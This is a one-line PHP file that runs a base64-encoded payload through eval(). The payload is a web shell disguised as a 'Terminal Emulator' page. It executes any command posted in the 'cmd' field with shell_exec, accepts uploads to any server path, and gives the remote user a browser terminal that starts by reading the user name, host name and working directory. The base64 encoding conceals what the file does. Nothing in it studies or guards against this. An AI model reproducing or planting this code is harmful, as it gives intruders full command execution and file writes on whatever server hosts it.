<?php eval("?>".base64_decode("PD9waHAKaWYgKElTU0VUKCRfUE9TVFsnY21kJ10pKSB7CiAgICAkb3V0cHV0ID0gcHJlZ19zcGxpdCgn L1tcbl0vJywgc2hlbGxfZXhlYygkX1BPU1RbJ2NtZCddLiIgMj4mMSIpKTsKICAgIGZvcmVhY2ggKCRv dXRwdXQgYXMgJGxpbmUpIHsKICAgICAgICBlY2hvIGh0bWxlbnRpdGllcygkbGluZSwgRU5UX1FVT1RF UyB8IEVOVF9IVE1MNSwgJ1VURi04JykgLiAiPGJyPiI7CiAgICB9CiAgICBkaWUoKTsgCn0gZWxzZSBp ZiAoIWVtcHR5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSkgJiYgIWVtcHR5KCRfUE9TVFsncGF0 aCddKSkgewogICAgJGZpbGVuYW1lID0gJF9GSUxFU1siZmlsZSJdWyJuYW1lIl07CiAgICAkcGF0aCA9 ICRfUE9TVFsncGF0aCddOwogICAgaWYgKCRwYXRoICE9ICIvIikgewogICAgICAgICRwYXRoIC49ICIv IjsKICAgIH0gCiAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImZpbGUiXVsidG1wX25h bWUiXSwgJHBhdGguJGZpbGVuYW1lKSkgewogICAgICAgIGVjaG8gaHRtbGVudGl0aWVzKCRmaWxlbmFt ZSkgLiAiIHN1Y2Nlc3NmdWxseSB1cGxvYWRlZCB0byAiIC4gaHRtbGVudGl0aWVzKCRwYXRoKTsKICAg IH0gZWxzZSB7CiAgICAgICAgZWNobyAiRXJyb3IgdXBsb2FkaW5nICIgLiBodG1sZW50aXRpZXMoJGZp bGVuYW1lKTsKICAgIH0KICAgIGRpZSgpOwp9Cj8+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0 aXRsZT5UZXJtaW5hbCBFbXVsYXRvcjwvdGl0bGU+CiAgICAgICAgPHN0eWxlPgogICAgICAgICAgICBo dG1sLCBib2R5IHsKICAgICAgICAgICAgICAgIG1heC13aWR0aDogMTAwJTsKICAgICAgICAgICAgfQog ICAgICAgIAogICAgICAgICAgICBib2R5IHsKICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAg ICAgICAgICAgICAgaGVpZ2h0OiAxMDAlOwogICAgICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAg ICAgICAgICAgYmFja2dyb3VuZDogIzAwMDsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAg ICAgICAgYm9keSwgLmlucHV0dGV4dCB7CiAgICAgICAgICAgICAgICBmb250LWZhbWlseTogIkx1Y2lk YSBDb25zb2xlIiwgIkx1Y2lkYSBTYW5zIFR5cGV3cml0ZXIiLCBtb25hY28sICJCaXRzdHJlYW0gVmVy YSBTYW5zIE1vbm8iLCBtb25vc3BhY2U7CiAgICAgICAgICAgICAgICBmb250LXNpemU6IDE0cHg7CiAg ICAgICAgICAgICAgICBmb250LXN0eWxlOiBub3JtYWw7CiAgICAgICAgICAgICAgICBmb250LXZhcmlh bnQ6IG5vcm1hbDsKICAgICAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA0MDA7CiAgICAgICAgICAgICAg ICBsaW5lLWhlaWdodDogMjBweDsKICAgICAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAg ICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgLmNvbnNvbGUgewogICAgICAgICAgICAgICAgd2lk dGg6IDEwMCU7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDEwMCU7CiAgICAgICAgICAgICAgICBtYXJn aW46IGF1dG87CiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgICAg ICBjb2xvcjogI2ZmZjsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgLm91dHB1 dCB7CiAgICAgICAgICAgICAgICB3aWR0aDogYXV0bzsKICAgICAgICAgICAgICAgIGhlaWdodDogYXV0 bzsKICAgICAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgICAgIG92ZXJm bG93LXk6IHNjcm9sbDsKICAgICAgICAgICAgICAgIHRvcDogMDsKICAgICAgICAgICAgICAgIGJvdHRv bTogMzBweDsKICAgICAgICAgICAgICAgIGxlZnQ6IDVweDsKICAgICAgICAgICAgICAgIHJpZ2h0OiAw OwogICAgICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7CiAgICAgICAgICAgIH0KICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIC5pbnB1dCBmb3JtIHsKICAgICAgICAg ICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsKICAgICAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDBw eDsKICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgLnVzZXJuYW1l IHsKICAgICAgICAgICAgICAgIGhlaWdodDogMzBweDsKICAgICAgICAgICAgICAgIHdpZHRoOiBhdXRv OwogICAgICAgICAgICAgICAgcGFkZGluZy1sZWZ0OiA1cHg7CiAgICAgICAgICAgICAgICBsaW5lLWhl aWdodDogMzBweDsKICAgICAgICAgICAgICAgIGZsb2F0OiBsZWZ0OwogICAgICAgICAgICB9CgogICAg ICAgICAgICAuaW5wdXQgewogICAgICAgICAgICAgICAgYm9yZGVyLXRvcDogMXB4IHNvbGlkICMzMzMz MzM7CiAgICAgICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgICAgIGhlaWdodDogMzBw eDsKICAgICAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgICAgIGJvdHRv bTogMDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLmlucHV0dGV4dCB7CiAgICAgICAgICAgICAg ICB3aWR0aDogYXV0bzsKICAgICAgICAgICAgICAgIGhlaWdodDogMzBweDsKICAgICAgICAgICAgICAg IGJvdHRvbTogMHB4OwogICAgICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMHB4OwogICAgICAgICAg ICAgICAgYmFja2dyb3VuZDogIzAwMDsKICAgICAgICAgICAgICAgIGJvcmRlcjogMDsKICAgICAgICAg ICAgICAgIGZsb2F0OiBsZWZ0OwogICAgICAgICAgICAgICAgcGFkZGluZy1sZWZ0OiA4cHg7CiAgICAg ICAgICAgICAgICBjb2xvcjogI2ZmZjsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAg ICAgLmlucHV0dGV4dDpmb2N1cyB7CiAgICAgICAgICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICAg ICAgICB9CgogICAgICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyIHsKICAgICAgICAgICAgICAgIHdp ZHRoOiAxMnB4OwogICAgICAgICAgICB9CgogICAgICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRy YWNrIHsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMxMDEwMTA7CiAgICAgICAgICAgIH0KCiAg ICAgICAgICAgIDo6LXdlYmtpdC1zY3JvbGxiYXItdGh1bWIgewogICAgICAgICAgICAgICAgYmFja2dy b3VuZDogIzMwMzAzMDsgCiAgICAgICAgICAgIH0KICAgICAgICA8L3N0eWxlPgogICAgPC9oZWFkPgog ICAgPGJvZHk+CiAgICAgICAgPGRpdiBjbGFzcz0iY29uc29sZSI+CiAgICAgICAgICAgIDxkaXYgY2xh c3M9Im91dHB1dCIgaWQ9Im91dHB1dCI+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0 IiBpZD0iaW5wdXQiPgogICAgICAgICAgICAgICAgPGZvcm0gaWQ9ImZvcm0iIG1ldGhvZD0iR0VUIiBv blN1Ym1pdD0ic2VuZENvbW1hbmQoKSI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idXNl cm5hbWUiIGlkPSJ1c2VybmFtZSI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IGNsYXNz PSJpbnB1dHRleHQiIGlkPSJpbnB1dHRleHQiIHR5cGU9InRleHQiIG5hbWU9ImNtZCIgYXV0b2NvbXBs ZXRlPSJvZmYiIGF1dG9mb2N1cz4KICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgPC9k aXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGZvcm0gaWQ9InVwbG9hZCIgbWV0aG9kPSJQT1NUIiBz dHlsZT0iZGlzcGxheTogbm9uZTsiPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0i ZmlsZSIgaWQ9ImZpbGVicm93c2VyIiBvbmNoYW5nZT0ndXBsb2FkRmlsZSgpJyAvPgogICAgICAgIDwv Zm9ybT4KICAgICAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgICAgICAgICAgIHZh ciB1c2VybmFtZSA9ICIiOwogICAgICAgICAgICB2YXIgaG9zdG5hbWUgPSAiIjsKICAgICAgICAgICAg dmFyIGN1cnJlbnREaXIgPSAiIjsKICAgICAgICAgICAgdmFyIHByZXZpb3VzRGlyID0gIiI7CiAgICAg ICAgICAgIHZhciBkZWZhdWx0RGlyID0gIiI7CiAgICAgICAgICAgIHZhciBjb21tYW5kSGlzdG9yeSA9 IFtdOwogICAgICAgICAgICB2YXIgY3VycmVudENvbW1hbmQgPSAwOwogICAgICAgICAgICB2YXIgaW5w dXRUZXh0RWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpbnB1dHRleHQnKTsKICAgICAg ICAgICAgdmFyIGlucHV0RWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpbnB1dCIpOwog ICAgICAgICAgICB2YXIgb3V0cHV0RWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJvdXRw dXQiKTsKICAgICAgICAgICAgdmFyIHVzZXJuYW1lRWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRC eUlkKCJ1c2VybmFtZSIpOwogICAgICAgICAgICB2YXIgdXBsb2FkRm9ybUVsZW1lbnQgPSBkb2N1bWVu dC5nZXRFbGVtZW50QnlJZCgidXBsb2FkIik7CiAgICAgICAgICAgIHZhciBmaWxlQnJvd3NlckVsZW1l bnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZmlsZWJyb3dzZXIiKTsKICAgICAgICAgICAgZ2V0 U2hlbGxJbmZvKCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBnZXRTaGVsbEluZm8o KSB7CiAgICAgICAgICAgICAgICB2YXIgcmVxdWVzdCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAg ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1 bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIGlmIChyZXF1ZXN0LnJlYWR5U3RhdGUgPT0gWE1M SHR0cFJlcXVlc3QuRE9ORSkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGFyc2VkUmVzcG9u c2UgPSByZXF1ZXN0LnJlc3BvbnNlVGV4dC5zcGxpdCgiPGJyPiIpOwogICAgICAgICAgICAgICAgICAg ICAgICB1c2VybmFtZSA9IHBhcnNlZFJlc3BvbnNlWzBdOwogICAgICAgICAgICAgICAgICAgICAgICBo b3N0bmFtZSA9IHBhcnNlZFJlc3BvbnNlWzFdOwogICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50 RGlyID0gIHBhcnNlZFJlc3BvbnNlWzJdLnJlcGxhY2UobmV3IFJlZ0V4cCgiJnNvbDsiLCAiZyIpLCAi LyIpOwogICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0RGlyID0gY3VycmVudERpcjsKICAgICAg ICAgICAgICAgICAgICAgICAgdXNlcm5hbWVFbGVtZW50LmlubmVySFRNTCA9ICI8ZGl2IHN0eWxlPSdj b2xvcjogI2ZmMDAwMDsgZGlzcGxheTogaW5saW5lOyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwv ZGl2PjoiK2N1cnJlbnREaXIrIiMiOwogICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVJbnB1dFdp ZHRoKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAg ICAgICByZXF1ZXN0Lm9wZW4oIlBPU1QiLCAiIiwgdHJ1ZSk7CiAgICAgICAgICAgICAgICByZXF1ZXN0 LnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVy bGVuY29kZWQiKTsKICAgICAgICAgICAgICAgIHJlcXVlc3Quc2VuZCgiY21kPXdob2FtaTsgaG9zdG5h bWU7IHB3ZCIpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAg ICBmdW5jdGlvbiBzZW5kQ29tbWFuZCgpIHsKICAgICAgICAgICAgICAgIHZhciByZXF1ZXN0ID0gbmV3 IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgICB2YXIgY29tbWFuZCA9IGlucHV0VGV4dEVs ZW1lbnQudmFsdWU7CiAgICAgICAgICAgICAgICB2YXIgb3JpZ2luYWxDb21tYW5kID0gY29tbWFuZDsK ICAgICAgICAgICAgICAgIHZhciBvcmlnaW5hbERpciA9IGN1cnJlbnREaXI7CiAgICAgICAgICAgICAg ICB2YXIgY2QgPSBmYWxzZTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY29tbWFuZEhp c3RvcnkucHVzaChvcmlnaW5hbENvbW1hbmQpOwogICAgICAgICAgICAgICAgc3dpdGNoQ29tbWFuZChj b21tYW5kSGlzdG9yeS5sZW5ndGgpOwogICAgICAgICAgICAgICAgaW5wdXRUZXh0RWxlbWVudC52YWx1 ZSA9ICIiOwoKICAgICAgICAgICAgICAgIHZhciBwYXJzZWRDb21tYW5kID0gY29tbWFuZC5zcGxpdCgi ICIpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAocGFyc2VkQ29tbWFuZFswXSA9 PSAiY2QiKSB7CiAgICAgICAgICAgICAgICAgICAgY2QgPSB0cnVlOwogICAgICAgICAgICAgICAgICAg IGlmIChwYXJzZWRDb21tYW5kLmxlbmd0aCA9PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNv bW1hbmQgPSAiY2QgIitkZWZhdWx0RGlyKyI7IHB3ZCI7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNl IGlmIChwYXJzZWRDb21tYW5kWzFdID09ICItIikgewogICAgICAgICAgICAgICAgICAgICAgICBjb21t YW5kID0gImNkICIrcHJldmlvdXNEaXIrIjsgcHdkIjsKICAgICAgICAgICAgICAgICAgICB9IGVsc2Ug ewogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gImNkICIrY3VycmVudERpcisiOyAiK2Nv bW1hbmQrIjsgcHdkIjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAg ICAgICAgICAgICAgICB9IGVsc2UgaWYgKHBhcnNlZENvbW1hbmRbMF0gPT0gImNsZWFyIikgewogICAg ICAgICAgICAgICAgICAgIG91dHB1dEVsZW1lbnQuaW5uZXJIVE1MID0gIiI7CiAgICAgICAgICAgICAg ICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwYXJzZWRDb21tYW5k WzBdID09ICJ1cGxvYWQiKSB7CiAgICAgICAgICAgICAgICAgICAgZmlsZUJyb3dzZXJFbGVtZW50LmNs aWNrKCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfSBl bHNlIHsKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gImNkICIrY3VycmVudERpcisiOyAiICsg Y29tbWFuZDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAg cmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAg ICBpZiAocmVxdWVzdC5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpIHsKICAgICAgICAg ICAgICAgICAgICAgICAgaWYgKGNkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGFy c2VkUmVzcG9uc2UgPSByZXF1ZXN0LnJlc3BvbnNlVGV4dC5zcGxpdCgiPGJyPiIpOwogICAgICAgICAg ICAgICAgICAgICAgICAgICAgcHJldmlvdXNEaXIgPSBjdXJyZW50RGlyOwogICAgICAgICAgICAgICAg ICAgICAgICAgICAgY3VycmVudERpciA9IHBhcnNlZFJlc3BvbnNlWzBdLnJlcGxhY2UobmV3IFJlZ0V4 cCgiJnNvbDsiLCAiZyIpLCAiLyIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0RWxl bWVudC5pbm5lckhUTUwgKz0gIjxkaXYgc3R5bGU9J2NvbG9yOiNmZjAwMDA7IGZsb2F0OiBsZWZ0Oyc+ Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvZGl2PjxkaXYgc3R5bGU9J2Zsb2F0OiBsZWZ0Oyc+Iisi OiIrb3JpZ2luYWxEaXIrIiMgIitvcmlnaW5hbENvbW1hbmQrIjwvZGl2Pjxicj4iOwogICAgICAgICAg ICAgICAgICAgICAgICAgICAgdXNlcm5hbWVFbGVtZW50LmlubmVySFRNTCA9ICI8ZGl2IHN0eWxlPSdj b2xvcjogI2ZmMDAwMDsgZGlzcGxheTogaW5saW5lOyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwv ZGl2PjoiK2N1cnJlbnREaXIrIiMiOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAg ICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0RWxlbWVudC5pbm5lckhUTUwgKz0gIjxkaXYgc3R5 bGU9J2NvbG9yOiNmZjAwMDA7IGZsb2F0OiBsZWZ0Oyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwv ZGl2PjxkaXYgc3R5bGU9J2Zsb2F0OiBsZWZ0Oyc+IisiOiIrY3VycmVudERpcisiIyAiK29yaWdpbmFs Q29tbWFuZCsiPC9kaXY+PGJyPiIgKyByZXF1ZXN0LnJlc3BvbnNlVGV4dC5yZXBsYWNlKG5ldyBSZWdF eHAoIjxicj48YnI+JCIpLCAiPGJyPiIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0 RWxlbWVudC5zY3JvbGxUb3AgPSBvdXRwdXRFbGVtZW50LnNjcm9sbEhlaWdodDsKICAgICAgICAgICAg ICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlSW5wdXRXaWR0aCgpOwog ICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgcmVx dWVzdC5vcGVuKCJQT1NUIiwgIiIsIHRydWUpOwogICAgICAgICAgICAgICAgcmVxdWVzdC5zZXRSZXF1 ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVk Iik7CiAgICAgICAgICAgICAgICByZXF1ZXN0LnNlbmQoImNtZD0iK2VuY29kZVVSSUNvbXBvbmVudChj b21tYW5kKSk7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAg ICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIHVwbG9hZEZpbGUoKSB7CiAgICAgICAgICAgICAgICB2 YXIgZm9ybURhdGEgPSBuZXcgRm9ybURhdGEoKTsKICAgICAgICAgICAgICAgIGZvcm1EYXRhLmFwcGVu ZCgnZmlsZScsIGZpbGVCcm93c2VyRWxlbWVudC5maWxlc1swXSwgZmlsZUJyb3dzZXJFbGVtZW50LmZp bGVzWzBdLm5hbWUpOwogICAgICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5kKCdwYXRoJywgY3VycmVu dERpcik7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciByZXF1ZXN0ID0gbmV3IFhN TEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHJlcXVlc3Qub25y ZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHJlcXVl c3QucmVhZHlTdGF0ZSA9PSBYTUxIdHRwUmVxdWVzdC5ET05FKSB7CiAgICAgICAgICAgICAgICAgICAg ICAgIG91dHB1dEVsZW1lbnQuaW5uZXJIVE1MICs9IHJlcXVlc3QucmVzcG9uc2VUZXh0KyI8YnI+IjsK ICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9OwoKICAgICAgICAgICAgICAgIHJl cXVlc3Qub3BlbigiUE9TVCIsICIiLCB0cnVlKTsKICAgICAgICAgICAgICAgIHJlcXVlc3Quc2VuZChm b3JtRGF0YSk7CiAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVySFRNTCArPSAiPGRpdiBz dHlsZT0nY29sb3I6I2ZmMDAwMDsgZmxvYXQ6IGxlZnQ7Jz4iK3VzZXJuYW1lKyJAIitob3N0bmFtZSsi PC9kaXY+PGRpdiBzdHlsZT0nZmxvYXQ6IGxlZnQ7Jz4iKyI6IitjdXJyZW50RGlyKyIjIFVwbG9hZGlu ZyAiK2ZpbGVCcm93c2VyRWxlbWVudC5maWxlc1swXS5uYW1lKyIuLi48L2Rpdj48YnI+IjsKICAgICAg ICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gdXBkYXRlSW5wdXRXaWR0aCgp IHsKICAgICAgICAgICAgICAgIGlucHV0VGV4dEVsZW1lbnQuc3R5bGUud2lkdGggPSBpbnB1dEVsZW1l bnQuY2xpZW50V2lkdGggLSB1c2VybmFtZUVsZW1lbnQuY2xpZW50V2lkdGggLSAxNTsKICAgICAgICAg ICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgZG9jdW1lbnQub25rZXlkb3duID0gY2hlY2tGb3JB cnJvd0tleXM7CgogICAgICAgICAgICBmdW5jdGlvbiBjaGVja0ZvckFycm93S2V5cyhlKSB7CiAgICAg ICAgICAgICAgICBlID0gZSB8fCB3aW5kb3cuZXZlbnQ7CgogICAgICAgICAgICAgICAgaWYgKGUua2V5 Q29kZSA9PSAnMzgnKSB7CiAgICAgICAgICAgICAgICAgICAgcHJldmlvdXNDb21tYW5kKCk7CiAgICAg ICAgICAgICAgICB9IGVsc2UgaWYgKGUua2V5Q29kZSA9PSAnNDAnKSB7CiAgICAgICAgICAgICAgICAg ICAgbmV4dENvbW1hbmQoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAg ICAKICAgICAgICAgICAgZnVuY3Rpb24gcHJldmlvdXNDb21tYW5kKCkgewogICAgICAgICAgICAgICAg aWYgKGN1cnJlbnRDb21tYW5kICE9IDApIHsKICAgICAgICAgICAgICAgICAgICBzd2l0Y2hDb21tYW5k KGN1cnJlbnRDb21tYW5kLTEpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAg ICAgIAogICAgICAgICAgICBmdW5jdGlvbiBuZXh0Q29tbWFuZCgpIHsKICAgICAgICAgICAgICAgIGlm IChjdXJyZW50Q29tbWFuZCAhPSBjb21tYW5kSGlzdG9yeS5sZW5ndGgpIHsKICAgICAgICAgICAgICAg ICAgICBzd2l0Y2hDb21tYW5kKGN1cnJlbnRDb21tYW5kKzEpOwogICAgICAgICAgICAgICAgfQogICAg ICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBzd2l0Y2hDb21tYW5kKG5l d0NvbW1hbmQpIHsKICAgICAgICAgICAgICAgIGN1cnJlbnRDb21tYW5kID0gbmV3Q29tbWFuZDsKCiAg ICAgICAgICAgICAgICBpZiAoY3VycmVudENvbW1hbmQgPT0gY29tbWFuZEhpc3RvcnkubGVuZ3RoKSB7 CiAgICAgICAgICAgICAgICAgICAgaW5wdXRUZXh0RWxlbWVudC52YWx1ZSA9ICIiOwogICAgICAgICAg ICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBpbnB1dFRleHRFbGVtZW50LnZhbHVlID0g Y29tbWFuZEhpc3RvcnlbY3VycmVudENvbW1hbmRdOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVv dXQoZnVuY3Rpb24oKXsgaW5wdXRUZXh0RWxlbWVudC5zZWxlY3Rpb25TdGFydCA9IGlucHV0VGV4dEVs ZW1lbnQuc2VsZWN0aW9uRW5kID0gMTAwMDA7IH0sIDApOwogICAgICAgICAgICAgICAgfQogICAgICAg ICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZm9y bSIpLmFkZEV2ZW50TGlzdGVuZXIoInN1Ym1pdCIsIGZ1bmN0aW9uKGV2ZW50KXsKICAgICAgICAgICAg ICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCkKICAgICAgICAgICAgfSk7CiAgICAgICAgPC9zY3JpcHQ+ CiAgICA8L2JvZHk+CjwvaHRtbD4K")); ?>